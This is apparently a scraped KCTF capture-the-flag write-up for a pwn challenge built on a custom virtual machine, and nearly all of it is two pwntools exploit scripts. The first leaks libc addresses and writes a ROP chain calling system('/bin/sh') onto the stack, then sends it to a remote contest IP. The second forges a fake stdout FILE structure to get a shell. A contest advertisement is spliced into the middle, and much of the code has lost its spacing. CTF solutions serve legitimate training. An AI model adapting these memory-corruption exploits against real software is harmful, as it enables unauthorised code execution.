system_libc_offset = 0x50902  # or use 0x50902, for stack alignment

pop_rdi_ret_offset = 0x2a3e5

str_bin_sh_libc_offset = 0x1D8678

environ_libc_offset = 0x222200

# detect_begin = 0x550000000800

detect_begin = 0x555500000800

# detect_begin = 0x55555555b000

code =

code_load_u64(0, detect_begin) +

code_load_u64(7, 0x7fffffff_ffffffff) +

f"""

mov r2, r7

add r2, {0x80000000_00200000-0x7fffffff_ffffffff}

L1:

mov r1, 1

add r1, r7

add r0, 0x1000

add r1, r0

je r1, r2, L1

L2:

# now , r0 points to a heap address

mov r6, r0

sub r0, {heap_imem_mmap_pointer_offset}

add r0, 1

add r0, r7

mov r5, [r0]

# now, r5 points to imem mmap addr

mov r4, r5

sub r4, {mmap_imem_libc_offset}

# now, r4 point to libc base

mov r0, r4

add r0, {environ_libc_offset}

add r0, 1

add r0, r7

mov r3, [r0]

# now, r3 points to environment on stack

sub r3, {stack_environ_return_address_offset}

# now, r3 points to return address on stack

mov r1, r4

add r1, {pop_rdi_ret_offset}

mov r0, r3

add r0, 1

add r0, r7

mov [r0], r1

# now, store pop_rdi_ret addr in return_addr[0]

mov r1, r4

add r1, {str_bin_sh_libc_offset}

mov r0, r3

add r0, 9

add r0, r7

mov [r0], r1

# now, store str_bin_sh addr in return_addr[1]

mov r1, r4

add r1, {system_libc_offset}

mov r0, r3

add r0, 17

add r0, r7

mov [r0], r1

# now, store system addr in return_addr[2]

hlt

# pwn!

"""

code_bytes = assemble(code)

s = remote("123.57.66.184", 10017)

# s = remote("127.0.0.1", 9999)

# s = process("./pwn", stdout=PIPE, aslr=True)

# s = process("./pwn_patched", aslr=True)

# gdb.attach(s, "brva 0x2DF4")

s.send(code_bytes)

time.sleep(10)

s.sendline(b"cat flag")

s.sendline(b"ls -alh")

s.sendline(b"ls -alh /")

try:

r = s.recv()

print(hex(mmap_imem_libc_offset), r)

except EOFError:

pass

s.interactive()

# x /8xg *(unsigned long *)(*(unsigned long *)$rebase(0x5050)+0x20)

扫码参赛

第九题《智斗邪首》火热挑战中

关于KCTF

看雪CTF（简称KCTF）是圈内知名度最高的技术竞技，从原CrackMe攻防大赛中发展而来，采取线上PK的方式，规则设置严格周全，题目涵盖Windows、Android、iOS、Pwn、智能设备、Web等众多领域。

– End –

球分享

球点赞

球在看


```
0x4000000000200000 +  0x4000000000000000 = 0x8000000000200000通用寄存器 + 通用寄存器 = 指针寄存器
adjust_pointer(invalid_pointer) = data_pointeradjust_pointer(stack_addr) = stack_addr
crack_addr= (0x5800<<32) +0x320
nvm=vm(p)
#构造出0x58000000032
nvm.mov_reg_from_imm(5, 1)
nvm.mov_reg_from_imm(3, 0xffff)
nvm.mov_reg_from_imm(0, 0x10000000)
nvm.mul_reg_from_imm(0, 0x80000000)
nvm.mul_reg_from_imm(0, 0x10)
nvm.mov_reg_from_imm(1, (crack_addr>>32)|(1<<31))
nvm.mul_reg_from_imm(1, 0x10000000)
nvm.add_reg_from_imm(1, 0x32)

#(0x58000000032+i*0x100)*0x10 = 0x580000000320+0x1000*i
nvm.mov_reg_from_imm(2, 0x10)
nvm.mul_reg_from_reg(2, 1)
nvm.add_reg_from_imm(2, 0)
nvm.store_mem(0, 5)
nvm.store_mem(2, 3)
nvm.load_mem(4, 0)
nvm.add_reg_from_imm(1, 0x100)
nvm.jump_equal(4, 3, -8&(2**32-1))#逐个遍历，直到指向的是stack地址，使得data段上不存有0xffff。
nvm.sub_reg_from_imm(1, 0x100)
frompwnimport*

classvm:
    def__init__(self, p):
        self.code=b''
        self.p=p

    defmake(self, op, dst, src, imm):
        returnp8(op)+p8(dst)+p8(src)+p8(0)+p32(imm)

    defexit_vm(self):
        self.code+=self.make(0, 0, 0, 0)
        
    defpush_reg(self, dst):
        self.code+=self.make(0, dst, 0, 0)

    defpush_imm(self, imm):
        self.code+=self.make(1, 0, 0, imm)

    defpush_imm_pointer(self, imm):
        self.code+=self.make(2, 0, 0, imm)

    defpop(self, dst):
        self.code+=self.make(3, dst, 0, 0)

    defmov_reg_from_reg(self, dst, src):
        self.code+=self.make(4, dst, src, 0)
        
    defmov_reg_from_imm(self, dst, imm):
        self.code+=self.make(5, dst, 0, imm)
        
    defadd_reg_from_reg(self, dst, src):
        self.code+=self.make(6, dst, src, 0)

    defadd_reg_from_imm(self, dst, imm):
        self.code+=self.make(7, dst, 0, imm)
        
    defsub_reg_from_reg(self, dst, src):
        self.code+=self.make(8, dst, src, 0)

    defsub_reg_from_imm(self, dst, imm):
        self.code+=self.make(9, dst, 0, imm)
        
    defmul_reg_from_reg(self, dst, src):
        self.code+=self.make(10, dst, src, 0)

    defmul_reg_from_imm(self, dst, imm):
        self.code+=self.make(11, dst, 0, imm)

    defload_mem(self, dst, src):
        self.code+=self.make(20, dst, src, 0)

    defstore_mem(self, dst, src):
        self.code+=self.make(21, dst, src, 0)
        
    defjump_equal(self, dst, src, imm):
        self.code+=self.make(24, dst, src, imm)

    defgo(self):
        self.p.send(self.code)

    defclear(self):
        self.code=b''

libc=ELF('./libc.so.6')
p=remote('127.0.0.1', 9999)
crack_addr= (0x5800<<32) +0x320#0x5800是折中的计算，可能需要多运行几次，可自行调整。
print(hex(crack_addr))
ld_offset=0x262000
stdout_offset=0x21b780
wfile_jump_offset=0x2170c0
nvm=vm(p)
nvm.mov_reg_from_imm(5, 1)
nvm.mov_reg_from_imm(3, 0xffff)
nvm.mov_reg_from_imm(0, 0x10000000)
nvm.mul_reg_from_imm(0, 0x80000000)
nvm.mul_reg_from_imm(0, 0x10)
nvm.mov_reg_from_imm(1, (crack_addr>>32)|(1<<31))
nvm.mul_reg_from_imm(1, 0x10000000)
nvm.add_reg_from_imm(1, 0x32)
nvm.mov_reg_from_imm(2, 0x10)
nvm.mul_reg_from_reg(2, 1)
nvm.add_reg_from_imm(2, 0)
nvm.store_mem(0, 5)
nvm.store_mem(2, 3)
nvm.load_mem(4, 0)
nvm.add_reg_from_imm(1, 0x100)
nvm.jump_equal(4, 3, -8&(2**32-1))
nvm.sub_reg_from_imm(1, 0x100)
nvm.load_mem(7, 7)
nvm.mul_reg_from_imm(1, 0x8)
nvm.sub_reg_from_imm(1, 0x68//2)
nvm.mov_reg_from_imm(2, 0x2)
nvm.mul_reg_from_reg(2, 1)
nvm.load_mem(0, 2)
nvm.sub_reg_from_imm(0, ld_offset)
nvm.mov_reg_from_reg(1, 0)
nvm.add_reg_from_imm(1, stdout_offset)
# fake_io = flat({
  # 0x0:b' sh',
  # 0xa0:
p64(stdout),
  # 0x10:
p64(libc.symbols['system']),
  # 0x20:
p64(stdout),
  # 0xd8: p64(wfile_jump + 0x48 - 0x38),
  # 0x88:
p64(stdout-0x30),
  # 0xe0:
p64(stdout-8),
# },filler=b'x00')
nvm.mov_reg_from_imm(7, 0x80000000)
nvm.mul_reg_from_imm(7, 0x80000000)
offset_list= [0x10, 0x20, 0x88, 0xa0, 0xd8, 0xe0]
data_list= [libc.symbols['system'], stdout_offset, stdout_offset-0x30, stdout_offset, wfile_jump_offset+0x48-0x38, stdout_offset-8]
nvm.mov_reg_from_reg(2, 1)
nvm.mov_reg_from_imm(3, u32(b' shx00'))
nvm.add_reg_from_reg(2, 7)
nvm.add_reg_from_reg(2, 7)
nvm.store_mem(2, 3)
nvm.mov_reg_from_reg(2, 1)
nvm.add_reg_from_imm(2, 0x18)
nvm.mov_reg_from_imm(3, 0)
nvm.add_reg_from_reg(2, 7)
nvm.add_reg_from_reg(2, 7)
nvm.store_mem(2, 3)
foriinrange(6):
    nvm.mov_reg_from_reg(2, 1)
    nvm.mov_reg_from_reg(3, 0)
    nvm.add_reg_from_imm(2, offset_list[i])
    nvm.add_reg_from_imm(3, data_list[i])
    nvm.add_reg_from_reg(2, 7)
    nvm.add_reg_from_reg(2, 7)
    nvm.store_mem(2, 3)

nvm.load_mem(0, 0)
nvm.go()
p.recvuntil('ointer.')
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722051-wxsync-2025-09-7fdafc140c0d99fb1a67f88dc3cbd7d6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722052-wxsync-2025-09-dde26ffb7eeeae9b3c9f6fb16feb4e13.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722054-wxsync-2025-09-435bbd964c68061cba0ae8e74b92e440.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722055-wxsync-2025-09-2c6fb8bddbb5971fd8242be1ee4b5bb1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722056-wxsync-2025-09-f9a0f7e16e882a0094aba296ff235158.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722058-wxsync-2025-09-afc7acd78ba815d195db786ba395945f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722059-wxsync-2025-09-2658047d383149a4c04cfec064528fb8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722061-wxsync-2025-09-10c4cc036a38899e906a00e2a2c1d62b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722062-wxsync-2025-09-0698ce472860d3256bd20424c8253e50.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1756722064-wxsync-2025-09-8d0b338243a1e5d4379a326c1102e98c.png)